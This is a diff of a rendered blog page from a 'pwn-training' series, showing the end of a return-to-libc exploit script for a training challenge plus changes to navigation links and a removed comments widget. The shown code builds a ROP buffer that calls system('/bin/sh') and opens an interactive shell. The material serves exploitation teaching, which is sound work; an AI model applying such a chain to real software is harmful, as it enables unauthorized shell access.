+</span><span class="nf">print</span><span class="p">(</span><span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)))</span> <span class="c1"># find the address of libc bin/sh
+</span><span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)))</span> 
+<span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">binary_base</span><span class="o">+</span><span class="mh">0x0000000000001016</span><span class="p">)</span> <span class="c1"># return to make sure stack is aligned before a glibc call
+</span><span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">)</span> <span class="c1"># call system.
 </span>
-<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Missed again??? I'm so disappointed."</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">"</span><span class="s">Missed again??? I</span><span class="sh">'</span><span class="s">m so disappointed.</span><span class="sh">"</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>
 
 
-<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
 <p>Hope you loved this challenge in the training !Happy Hacking! :D</p>
@@ -541,34 +541,18 @@ b* main+164
 
 </article>
 <div class="post-nav">
-<a class="previous" href="/pwn-training/2021/05/20/format-string-exploitation-training2.html" title="Format String Exploitation">Format String Exploitation</a><a class="next" href="/writeup/2021/12/30/inctfjquals.html" title="Leaky pipes - InCTFj Quals">Leaky pipes - InCTFj Quals</a>
+<a class="previous" href="/pwn-training/2021/05/20/format-string-exploitation-training2.html" title="[pwn 2] Format String Exploitation">[pwn 2] Format String Exploitation</a><a class="next" href="/writeup/2021/12/30/inctfjquals.html" title="Leaky pipes - InCTFj Quals">Leaky pipes - InCTFj Quals</a>
 </div>
 <div class="post-related">
       <div>Related Articles</div>
       <ul>
-        <li><a class="post-link" href="/blogs/2021/03/27/sqlinjection.html" title="Leaky pipes - InCTFj Quals">SQL Injection</a></li>
+        <li><a class="post-link" href="/pwn-training/2021/05/24/return2libcpwntrain.html" title="Leaky pipes - InCTFj Quals">[pwn 3] Return to libc</a></li>
+<li><a class="post-link" href="/writeup/2020/04/30/pwnabletw2.html" title="Leaky pipes - InCTFj Quals">ORW - pwnable.tw</a></li>
 <li><a class="post-link" href="/writeup/2021/12/30/inctfjquals.html" title="Leaky pipes - InCTFj Quals">Leaky pipes - InCTFj Quals</a></li>
-<li><a class="post-link" href="/blogs/2020/09/11/blog2.html" title="Leaky pipes - InCTFj Quals">Dynamic and Static Linking</a></li>
-<li><a class="post-link" href="/writeup/2020/03/20/zhero-ctf.html" title="Leaky pipes - InCTFj Quals">c4n4ry Writeup | zh3r0 CTF</a></li>
+<li><a class="post-link" href="/writeup/2020/04/29/pwnabletw1.html" title="Leaky pipes - InCTFj Quals">Start - pwnable.tw</a></li>
 </ul>
     </div>
-<div class="post-comments">
-<div id="disqus_thread"></div>
-<script>
-  var disqus_config = function () {
-    this.page.url = 'http://pranavkrish04.github.io/pwn-training/2021/05/24/return2libcpwntrain.html';
-    this.page.identifier = 'http://pranavkrish04.github.io/pwn-training/2021/05/24/return2libcpwntrain.html';
-  };
-  (function() {
-    var d = document, s = d.createElement('script');
-    s.src = 'https://tourpran.disqus.com/embed.js';
-    s.setAttribute('data-timestamp', +new Date());
-    (d.head || d.body).appendChild(s);
-  })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
-</noscript>
-</div></section>
+<div class="post-comments"></div></section>
 </div>
 
 
